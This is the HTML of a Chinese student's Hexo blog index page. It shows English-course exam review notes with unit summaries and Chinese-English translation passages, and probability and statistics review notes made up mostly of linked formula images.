<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="Hello Nerd">
<meta property="og:type" content="website">
<meta property="og:title" content="Existo&#39;s Blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Existo&#39;s Blog">
<meta property="og:description" content="Hello Nerd">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Existo">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Existo's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Existo's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/03/%E5%A4%A7%E8%8B%B1%E4%B8%89%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Existo">
      <meta itemprop="description" content="Hello Nerd">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Existo's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/03/%E5%A4%A7%E8%8B%B1%E4%B8%89%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/" class="post-title-link" itemprop="url">大英三期末复习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-01-03 10:11:39 / 修改时间：10:50:50" itemprop="dateCreated datePublished" datetime="2022-01-03T10:11:39+08:00">2022-01-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">学习</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="题纲"><a href="#题纲" class="headerlink" title="题纲"></a>题纲</h2><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20220103101247243.png" alt="image-20220103101247243" style="zoom: 50%;" /></p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20220103101553057.png" alt="image-20220103101553057" style="zoom: 33%;" /></p>
<h2 id="Summary-1-7单元"><a href="#Summary-1-7单元" class="headerlink" title="Summary(1-7单元)"></a>Summary(1-7单元)</h2><h3 id="UNIT-1"><a href="#UNIT-1" class="headerlink" title="UNIT 1"></a>UNIT 1</h3><h4 id="1-1-catching-crabs"><a href="#1-1-catching-crabs" class="headerlink" title="1.1 catching crabs"></a>1.1 catching crabs</h4><p>​    In the fall of our final year, our mood changed. The relaxed atmosphere had disappeared, and the peer group pressure to work hard was strong. Meanwhile, at the back of everyone’s mind was what we would do next after graduation. As for me, I wanted to travel, and I wanted to be a writer. I braced myself for some resistance to the idea from my father, who wanted me to go to law school, and follow his path through life. </p>
<p>​    However, he supported what I wanted but he made me think about it by watching the crabs. The <em>cage</em>(笼子) was full of crabs. One of them was trying to escape, but each time it reached the top the other crabs pulled it back. In the end it gave up lengthy struggle to escape and started to prevent other crabs from escaping. By watching crabs, my father told me not to be pulled back by others, and to get to know oneself better.</p>
<h4 id="1-2-We-are-all-dying"><a href="#1-2-We-are-all-dying" class="headerlink" title="1.2 We are all dying"></a>1.2 We are all dying</h4><p>​    Life is short. We never quite know when we become coffin dwellers or <em>trampled</em>(践踏) ash in the rose<br>garden of some local ceremony. So there’s no point in putting our dreams on the back burner until<br>the right time arrives. Now is the time to do what we want to do. Make the best of our short stay<br>and fill our life with the riches on offer so that when the <em>reaper</em>(死神) arrives, we’ve achieved much<br>instead of regrets.</p>
<h3 id="UNIT-2"><a href="#UNIT-2" class="headerlink" title="UNIT 2"></a>UNIT 2</h3><h4 id="2-1-Superman"><a href="#2-1-Superman" class="headerlink" title="2.1 Superman"></a>2.1 Superman</h4><p>​    The extract from Johnny Panic and the Bible of Dreams by Sylvia Plath is a combination of her<br>real life and imaginary life in her childhood.In the real life,Plath was a winner of the prize for<br>drawing the best Civil Defense signs,lived by an airport and had an Uncle who bore resemblance<br>to Superman. In her imagination,the airport was her Mecca and Jerusalem because of her flying<br>dreams. Superman fulfilled her dream at the moment.<br>​    David Stirling, a bookish boy,also worship Superman.During the recess at school,he and the author<br>played Superman games.Compared with their school-mates who played the routine games,they<br>felt they were outlaws but had a sense of windy superiority.They also found a stand-in, Sheldon<br>Fein, who later invented tortures.</p>
<h4 id="2-2-Cultual-Childhoods"><a href="#2-2-Cultual-Childhoods" class="headerlink" title="2.2 Cultual Childhoods"></a>2.2 Cultual Childhoods</h4><p>Historically, childhood has undergone enormous transformations in terms of children’s<br>responsibilities and parental expectations. Culturally, childhood is socially constructed. The<br>interplay of history and cultural leads to different understanding of childhood, consequently it is<br>advisable not to impose ideas from one culture to understand childhood in another culture.</p>
<h3 id="UNIT-3"><a href="#UNIT-3" class="headerlink" title="UNIT 3"></a>UNIT 3</h3><h4 id="3-1-How-We-Listen"><a href="#3-1-How-We-Listen" class="headerlink" title="3.1 How We Listen"></a>3.1 How We Listen</h4><p>For the sake of clarify,we split up the process of listening to music into three hypothetical<br>planes.Firstly,the sensuous plane.It is a kind of brainless but attractive state of mind engendered by the mere sound appeal of the music.Secondly,the expressive plane.It is when we believe each<br>piece of music has a theme,which mirrors a different world of feeling,such as<br>gaiety,sadness.Thirdly,the musical plane.It is the ability to experience different musical<br>elements,such as melodies,the rhythms,the harmonies,the tone colors etc. We usually listen to<br>music on all three planes.</p>
<h4 id="3-2-The-mystery-of-Girl-with-a-Pearl-Earring"><a href="#3-2-The-mystery-of-Girl-with-a-Pearl-Earring" class="headerlink" title="3.2 The mystery of Girl with a Pearl Earring"></a>3.2 The mystery of Girl with a Pearl Earring</h4><p>The painting Girl with a Pearl Earring is one of Dutch painter Johannes Vermeer ‘s masterworks.It<br>shows a striking young woman wearing an exotic costume and a turban,peering over her shoulder<br>straight out at the viewer.As the name implies,it uses a pearl earring for a focal point.It has been<br>referred to as the Mona Lisa of the north,because,like Leonardo da Vinci’s painting,it appears to<br>be a simple likeness of a woman with an enigmatic smile,yet which contains levels of meanings<br>and questions.So much mystery in the painting contributes to its worldwide popularity and<br>generates a thoroughly rewarding novel and a well-composed film.</p>
<h3 id="UNIT-4"><a href="#UNIT-4" class="headerlink" title="UNIT 4"></a>UNIT 4</h3><h4 id="4-1-Work-in-corporate-America"><a href="#4-1-Work-in-corporate-America" class="headerlink" title="4.1 Work in corporate America"></a>4.1 Work in corporate America</h4><p>In today’s American jobs are not what they used to be.Not long ago,when a father was asked about<br>his job he could answer in terms that a child could come to grips with.Nowadays,when the parent<br>take his offspring to his place of business in glass buildings that are really incomprehensive to<br>children. What’s more,it’s safe bet that even grown men have trouble visualizing what other men<br>does in their jobs with his day.Therefore,it’s not difficult to imagine a poor child may<br>answer’ ‘mulling over” after it beats me the mysteries of work, when his friends asks him of his<br>father’s job.</p>
<h4 id="4-2-Our-supposedly-exciting-times-are-really-rather-dull"><a href="#4-2-Our-supposedly-exciting-times-are-really-rather-dull" class="headerlink" title="4.2 Our supposedly exciting times are really rather dull"></a>4.2 Our supposedly exciting times are really rather dull</h4><p>Living in a world of unprecedented/dazzling change,there are never been anything quite like<br>it.However,we are just ignorant of/ about deeper historical patterns,take globalization for<br>example,from historical context point of view,the world is almost meaningless. We simply do not<br>live in a age of great technological innovation for all our enthusiasm about internet and iPod. With<br>staggering 90 percent of all web traffic is local,we are always be told the Internet has“opened<br>up”the world.As the Chinese curse runs“May you live in interesting times”,it can bring chaos and<br>anxiety in the in the wake.</p>
<h3 id="UNIT-5"><a href="#UNIT-5" class="headerlink" title="UNIT 5"></a>UNIT 5</h3><h4 id="5-1-Dinner-at-Joanne’s"><a href="#5-1-Dinner-at-Joanne’s" class="headerlink" title="5.1 Dinner at Joanne’s"></a>5.1 Dinner at Joanne’s</h4><p>When a young black man arrives in a crowded and expensive restaurant,the head waiter makes<br>him sit in the least comfortable place,even though a table has been booked for him and a “Ms<br>Rogers”.<br>When Ms Rogers arrives,the waiter realizes that she is a well-known Senator; and Ms Roger<br>realizes that her friend has been treated badly because of the color of his skin. The waiter realizes<br>his mistake too,and tries to make up for it,but it’s too late.</p>
<h4 id="5-2-We-they"><a href="#5-2-We-they" class="headerlink" title="5.2 We they"></a>5.2 We they</h4><p>The writer uses stories about doing business between Swedes and Saudis to ilustrate the<br>differences between an individualist and a collectivist approach to business. They have different<br>concepts of the role of personal relationships in business. The Swedes believe the business is done with a company while the Saudis think it should be done with a person they know and trust.Then<br>the writer compares the characteristics of the collectivist and those of the individualist.<br>In the most collectivist societies,the families are usually extended families while in the<br>individualist societies,nuclear families are prevalent. People consider themselves as part of a<br>“we”group or in-group in the collectivist societies.In contrast, the individualist think of themselves<br>as“T”,their personal identity which is distinct from other people’s. A practical and psychological<br>dependence relationship develops between the person and the in-group in the collectivist societies.<br>However, rarely do people depend on a group in the individualist societies.</p>
<h3 id="UNIT-6"><a href="#UNIT-6" class="headerlink" title="UNIT 6"></a>UNIT 6</h3><h4 id="6-1-Last-man-down"><a href="#6-1-Last-man-down" class="headerlink" title="6.1 Last man down"></a>6.1 Last man down</h4><p>The text from Last Ma Down offers an eyewitness account of defining historical event of 9/11<br>attack from the perspective of Richard Picciotto, a firefighter; his story is that of a man, a hero,and<br>a tragic event that inspired the nation. His recount isn’t one of death and destruction, but a<br>celebration of life and it’s unpredictable nature.</p>
<h4 id="6-2-Eleanor-Roosevelt"><a href="#6-2-Eleanor-Roosevelt" class="headerlink" title="6.2 Eleanor Roosevelt"></a>6.2 Eleanor Roosevelt</h4><p>The passage offers a hero who contrasts with brave firefighters. This time she is a woman of<br>power and previlege who still wanted to devote herself to the sucess she believed in.<br>Living in a male-dominated world, Eleanor Roosevelt showed growing concerm for women’s<br>issues, along with those for labor issues,youth and civil rights issues.<br>Eleanor created new First Lady profile. She held a press conference for the female only. She was a .<br>great supporter for FDR, her wheel-bound husband, whose career as the US president offered her<br>opportunity to come into her own.<br>After FDR’s departure, she still held public posts to use her power to her beliefs.<br>Anna Eleanor Roosevelt never ran on a par with men, she set the place.</p>
<h2 id="汉译英"><a href="#汉译英" class="headerlink" title="汉译英"></a>汉译英</h2><h3 id="U1"><a href="#U1" class="headerlink" title="U1"></a>U1</h3><blockquote>
<p>中国有一句话，叫“人贵有自知之明”。这个观念的最早提出者是老子。老子在《道德经》里说“知人者智，自知者明”。有“自知之明”是指人应该对自己有正确的认识，了解自身的优点和缺点，清醒地知道自己能做什么。我们把人的自知视为“贵”，可见做到“自知”是多么的不易。“自知之明”是一种人生哲学，也是一种品德。它可以帮助我们不断地修正自己，朝着更高的人生目标迈进。</p>
</blockquote>
<p>As the Chinese saying goes, it is important to know oneself. The first person to put forward this notion was Laozi, who wrote in his book <em>Dao De Jing:</em> “A person who knows others is intelligent, but a person who knows himself is insightful.” To know oneself is to have a correct understanding of oneself, including one’s strengths and limitations, and to be clear-minded about what one can do. We cherish this virtue so much precisely because it is really hard for people to know themselves. Knowing oneself is both part of a philosophy of life and a virtue that can facilitate self-improvement and attainment of a higher life goal.</p>
<h3 id="U2"><a href="#U2" class="headerlink" title="U2"></a>U2</h3><blockquote>
<p>与父辈相比，现在的孩子在物质生活上要丰富得多，但在精神上则略有欠缺。他们不太可能和伙伴们一起玩，玩具取代伙伴成了他们最忠实的朋友。他们的父母从不缺钱给他们买各种贵重玩具。这样的好处是：他们不再整天缠着父母，因为玩具和电子游戏减轻了他们的孤独感。但也有负面影响：沉迷于玩具和电子游戏会让孩子视力下降或者让他们不愿意与别人交流。这种现象应引起家长和学校的关注。</p>
</blockquote>
<p>Compared with the childhood of their parents, children now do enjoy a far better material life, but their emotional life seems less satisfying. They are less likely to play with their peers, for toys have replaced their playmates as their most loyal friends. Their parents can always afford to buy them all kinds of expensive toys. The good thing about this is that they no longer pester their parents to play with them all day long, because toys and video games have lessened their feelings of loneliness. But there are also negative effects: The addiction to toys and video games may cause a child’s eyesight to deteriorate or result in reluctance to communicate with others. These phenomena should demand the attention of both parents and schools.</p>
<h3 id="U3"><a href="#U3" class="headerlink" title="U3"></a>U3</h3><blockquote>
<p>在敦煌莫高窟，最著名的艺术杰作要数壁画“飞天”（flying apsaras）。敦煌飞天是印度文化和中国文化共同孕育而成的。在印度，被称为“飞天”的空中飞行的天神（celestial beings）多出现在佛教石窟壁画（grotto mural）中，中国道教传统则把在空中飞行的天神称为“飞仙”（flying immortals）。魏晋南北朝时，佛教初传入中国，壁画中的飞仙开始被称为“飞天”。后来，随着佛教在中国的深入发展，佛教的飞天和道教的飞仙在艺术形象上相互融合。敦煌莫高窟的飞天是中国古代艺术家的杰作，是世界艺术史的奇迹。</p>
</blockquote>
<p>In the Mogao caves in Dunhuang, the murals with “flying apsaras” are one of the most well-known artefacts. The flying apsaras in the Dunhuang Grotto Murals are a product of the intermixing of Indian and Chinese culture. In India, flying celestial beings called “flying apsaras” appear mostly in murals in Buddhist caves, while in the Chinese Daoist tradition, flying celestial beings are known as “flying immortals”. During the Wei, Jin, and Northern and Southern dynasties, when the introduction of Buddhism in China was at an early stage, people began to use the term “flying apsaras” to refer to the flying immortals in the murals. Later, with the development of Buddhism in China, the artistic images of Buddhist flying apsaras and Daoist flying immortals merged with each other. The flying apsaras in the Dunhuang Grotto Murals are a most ingenious creation of ancient Chinese artists, and a marvel in the history of world art.</p>
<h3 id="U4"><a href="#U4" class="headerlink" title="U4"></a>U4</h3><blockquote>
<p>目前，中国老年人口居世界第一，已经进入老龄化社会。而中国现在正处于社会转型期，建立一个完整的社会福利体系仍需很长的一段时间，因此中国的养老问题较为特殊。预计在今后半个世纪，家庭养老仍然是中国主流的养老模式。孝敬父母（filial piety）一直是中国传统伦理道德（ethics）的重要组成部分。在当今这样一个老龄化的社会中，弘扬孝道就显得更加重要，因为在鼓励人们对家里的老人提供日常照顾和情感慰藉方面，孝道仍将起关键性的作用。</p>
</blockquote>
<p>China, with the largest population of elderly people in the world, has become an ageing society. Meanwhile, China is also a country undergoing social transition. It will be a long time before a sound social welfare system can be established, which means that China is in a unique situation when it comes to care of its ageing population. It is predicted that in the next 50 years, family care for the aged will still be the dominant practice in China. Filial piety has always been a significant part of traditional Chinese ethics. In today’s ageing society, it will be all the more important to promote the virtue of filial piety, as it will continue to play a crucial role in encouraging people to take good care of their elderly family members by providing daily care and emotional support.</p>
<h3 id="U5"><a href="#U5" class="headerlink" title="U5"></a>U5</h3><blockquote>
<p>女性是劳动力市场的重要组成部分。但是当前劳动就业中的性别歧视仍然存在，这与我国构建和谐社会的要求背道而驰。就劳动者而言，不能人尽其才，不仅造成人力资本投资的浪费，还会使她们对社会公正产生怀疑；就用人单位而言，性别歧视不仅破坏人才选拔的程序，造成人才浪费，也会不利于人们正确理解何为正常运转的市场；就社会而言，性别歧视不仅干扰人力资源的正常流动，还会破坏就业市场的公平环境。</p>
</blockquote>
<p>Women are an important part of the labour force. But gender discrimination in the job market still exists, and serves as a counterforce to the building of a harmonious society. As far as employees are concerned, jobs that do not suit their talents will not only give rise to a waste of the investment in human capital, but also cause them to lose faith in social justice. As for employers, gender discrimination will not only disrupt the process of selecting talent,and thus waste talent, but will also harm the perception of a properly functioning market. On the level of society, gender discrimination will set an obstacle to the proper distribution of human resources, and damage a fair environment in the job market.</p>
<h3 id="U6"><a href="#U6" class="headerlink" title="U6"></a>U6</h3><blockquote>
<p>春节是中国最重要的传统节日。但近年来，很多人都抱怨过年的气氛越来越淡，已经很难感受到记忆中过年的那种美好感觉了。事实上，春节在过去之所以显得重要，是因为只有到了春节人们才能享美食、穿新衣。而随着中国经济的迅速发展，人们的物质生活越来越丰富，人们庆祝春节的方式也发生了一些变化。比如说，越来越多的人选择过年时外出旅游。但无论如何，对于中国人来说，春节的重要性是不可替代的。</p>
</blockquote>
<p>The Spring Festival is the most important traditional holiday in China. But in recent years, many people have complained that the celebratory atmosphere of lunar New Year is not as strong as it used to be, and it is hard for them to regain that wonderful feeling in their memories. In fact, in the past, it was only during the Spring Festival that people could enjoy delicious food and wear new clothes. This explains why this holiday was so important to Chinese people. But with the rapid development of the Chinese economy and an increasingly rich material life, the ways in which Chinese people celebrate the Spring Festival have changed. For instance, more and more Chinese people choose to travel during the Spring Festival. Nonetheless, for Chinese people, the Spring Festival plays an irreplaceable role in their culture.</p>
<h3 id="U7"><a href="#U7" class="headerlink" title="U7"></a>U7</h3><blockquote>
<p>中国是世界上自然灾害较为严重的国家之一。在和平时期，抢险救灾是中国军队的一项重要任务。中国军队是抢险救灾的突击力量，承担最紧急、最艰难、最危险的救援任务。中国军人都是抱着打仗的心态在救灾，甚至冒着生命危险抢救灾民。每当解放军抵达灾区，群众都热烈欢迎，感到无比欣慰。中国军队在历次灾难救援中表现出的组织性、专业性、高效性赢得了人民群众的信任和赞誉。</p>
</blockquote>
<p>China is one of the countries that are most affected by natural disasters. In peacetime, rescue and relief work is an important part of the mission of the Chinese military. China’s armed forces always form task forces for rescue and relief work, taking on the most urgent, most difficult and most dangerous jobs. Chinese military personnel perform their rescue and relief work as if they were fighting a war, sometimes even at the risk of their own lives. Whenever the People’s Liberation Army (PLA) arrives at an area hit by a natural disaster, the local people will welcome them warmly and feel greatly relieved. The sense of organization, professionalism and efficiency they have displayed has helped them win the trust and praise of the public.</p>
<h3 id="U8"><a href="#U8" class="headerlink" title="U8"></a>U8</h3><blockquote>
<p>古希腊神话的最大特点就是神和人形相同、习相近。古希腊人按照人的形象来创造神，神有人的感情欲望。而中国古代神话中的神大多距离人类生活较远。中国神话中正面形象的神多具有崇高的品格、伟大的志向以及为实现伟大理想而斗争的不屈不挠的精神。他们承担着维护宇宙秩序的崇高责任，是社会道德的楷模。可以说中国古代神话中的神多具有超凡脱俗的品格，神性多于人性。</p>
</blockquote>
<p>The most important characteristic of ancient Greek mythology is that gods and humans are similar, both in physical appearance and personality. Ancient Greeks created their gods in their own image, and their gods have human emotions and desires. In Chinese mythology, however, the life of the gods is very different from that of humans. The good gods in Chinese mythology have a noble character, express great aspirations, and show perseverance in fighting for great ideals. They have the noble duty of maintaining the order of the universe; they are social and moral role models. It can be said that the gods in Chinese mythology have extraordinarily noble characters, and possess more of the qualities of gods than of humans.</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/28/%E6%A6%82%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Existo">
      <meta itemprop="description" content="Hello Nerd">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Existo's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/28/%E6%A6%82%E7%BB%9F%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">概统复习笔记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-12-28 21:00:34" itemprop="dateCreated datePublished" datetime="2021-12-28T21:00:34+08:00">2021-12-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-01-03 15:09:31" itemprop="dateModified" datetime="2022-01-03T15:09:31+08:00">2022-01-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">学习</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="互斥事件和相互独立事件"><a href="#互斥事件和相互独立事件" class="headerlink" title="互斥事件和相互独立事件"></a>互斥事件和相互独立事件</h2><p><img src="https://pic1.zhimg.com/v2-4a5398b58b525a30c8ce445c8d5a3ede_r.jpg?source=1940ef5c" alt="preview" style="zoom:50%;" /></p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20211228211228928.png" alt="image-20211228211228928" style="zoom:80%;" /></p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20211228211243676.png" alt="image-20211228211243676" style="zoom:80%;" /></p>
<p>如果<strong>不能同时发生</strong>，则互斥</p>
<p>如果可以同时发生，但二者没关系</p>
<blockquote>
<p>独立就像你和我，谁也不认识谁</p>
<p>互斥就是有你没我，有我没你</p>
</blockquote>
<h3 id="相互独立的判断"><a href="#相互独立的判断" class="headerlink" title="相互独立的判断"></a>相互独立的判断</h3><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20220103140147664.png" alt="image-20220103140147664" style="zoom:80%;" /></p>
<h2 id="事件运算的常用公式"><a href="#事件运算的常用公式" class="headerlink" title="事件运算的常用公式"></a>事件运算的常用公式</h2><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20211228211135323.png" alt="image-20211228211135323" style="zoom:80%;" /></p>
<h2 id="重要的分布"><a href="#重要的分布" class="headerlink" title="重要的分布"></a>重要的分布</h2><ul>
<li><p><a href="E:\Blog\source\_posts\几种重要的分布.md">本地文件</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="http://existot01.top/2021/12/07/%E5%87%A0%E7%A7%8D%E9%87%8D%E8%A6%81%E7%9A%84%E5%88%86%E5%B8%83/">博客链接</a></p>
</li>
</ul>
<h2 id="期望与方差的计算公式"><a href="#期望与方差的计算公式" class="headerlink" title="期望与方差的计算公式"></a>期望与方差的计算公式</h2><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20220103130809677.png" alt="image-20220103130809677" style="zoom:80%;" /></p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20220103130656628.png" alt="image-20220103130656628" style="zoom:80%;" /></p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20220103130706235.png" alt="image-20220103130706235" style="zoom:80%;" /></p>
<h2 id="统计量"><a href="#统计量" class="headerlink" title="统计量"></a>统计量</h2><ul>
<li>统计量<strong>不含任何未知参数</strong></li>
</ul>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20220103144324266.png" alt="image-20220103144324266" style="zoom:80%;" /></p>
<h2 id="三种常见分布"><a href="#三种常见分布" class="headerlink" title="三种常见分布"></a>三种常见分布</h2><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20220103133418659.png" alt="image-20220103133418659" style="zoom:80%;" /></p>
<h2 id="置信区间"><a href="#置信区间" class="headerlink" title="置信区间"></a>置信区间</h2><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20220103134611577.png" alt="image-20220103134611577" style="zoom:80%;" /></p>
<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20220103135126394.png" alt="image-20220103135126394" style="zoom:80%;" /></p>
<h2 id="协方差"><a href="#协方差" class="headerlink" title="协方差"></a>协方差</h2><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20220103140324636.png" alt="image-20220103140324636" style="zoom:80%;" /></p>
<h3 id="相关系数"><a href="#相关系数" class="headerlink" title="相关系数"></a>相关系数</h3><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20220103140820467.png" alt="image-20220103140820467" style="zoom:80%;" /></p>
<h2 id="切比雪夫不等式"><a href="#切比雪夫不等式" class="headerlink" title="切比雪夫不等式"></a>切比雪夫不等式</h2><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20220103142711667.png" alt="image-20220103142711667" style="zoom:80%;" /></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/26/%E6%94%AF%E9%85%8D%E9%9B%86%E3%80%81%E8%A6%86%E7%9B%96%E9%9B%86%E3%80%81%E7%8B%AC%E7%AB%8B%E9%9B%86%E4%B8%8E%E5%8C%B9%E9%85%8D/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Existo">
      <meta itemprop="description" content="Hello Nerd">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Existo's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
